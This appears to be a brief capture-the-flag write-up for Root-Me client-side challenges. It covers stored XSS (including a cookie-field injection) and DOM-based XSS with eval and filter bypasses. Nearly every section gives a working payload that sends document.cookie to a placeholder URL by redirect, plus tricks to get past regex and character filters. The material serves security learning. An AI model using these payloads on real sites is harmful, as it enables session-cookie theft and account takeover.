# Rootme-App-Client
App Client Challenges Summary

### XSS- Stored 1
Post a message with content is the following:
`<script>window.location.href="URL?c="+document.cookie</script>
`
### XSS - Stored 2
Post a random message, then Ctrl + U to view source code. 

There are 2 style definitions : `invite` & `admin`.

Besides, when open cookies manage, we see a value of `status` is `invite`. 

Change this value into `admin` and try posting a message, this change will affect to tag `i` after message title.

So we're going to exploit this.

Change `status` cookie into `"><script>window.location.href="URL?c="+document.cookie</script>` and post a message

### XSS DOM Based - Introduction

Submit a random number, we will see url has a param `number`. 

Ctrl + U to view source code. `number` variable get value from URL param.

Exploit this.

Submit number `'; window.location.href="URL?c="+document.cookie//`. 

This will break `''` of `number` variable, add `fetch` into script.

Submit URL in `Contact` page with param `RootmeURL?number='; window.location.href="URL?c="+document.cookie//`

### XSS DOM Based - Eval
This web use regex  /^\d+[\+|\-|\*|\/]\d+/ to check input. We can bypass by using the following input:

``1*24+";window.location.href=`URL?c=`+document.cookie;//"``

### XSS DOM Based - Filters Bypass
This web filters `;` or `+`. So we use `concat` instead.

It also filters `https` to check redirect. 

``'.concat(eval('document.location=`//URL?c=${document.cookie}`'))//``
